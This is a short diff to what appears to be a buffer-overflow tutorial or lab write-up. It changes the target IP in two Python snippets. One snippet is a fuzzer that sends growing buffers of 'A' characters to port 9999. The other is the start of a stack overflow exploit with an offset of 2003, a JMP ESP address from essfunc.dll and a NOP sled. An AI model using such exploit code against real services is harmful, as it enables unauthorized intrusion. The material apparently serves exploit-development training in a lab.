@@ -27,7 +27,7 @@ HELP
 ```python
 #!/usr/bin/python3
 import socket, time, sys
-ip, port = "192.168.1.50", 9999
+ip, port = "192.168.56.50", 9999
 buf = "A" * 100
 while True:
     try:
@@ -85,7 +85,7 @@ eip = b"\xaf\x11\x50\x62"
 #!/usr/bin/python3
 import socket
 
-ip, port = "192.168.1.50", 9999
+ip, port = "192.168.56.50", 9999
 offset = 2003
 eip = b"\xaf\x11\x50\x62"          # JMP ESP מתוך essfunc.dll
 nops = b"\x90" * 16
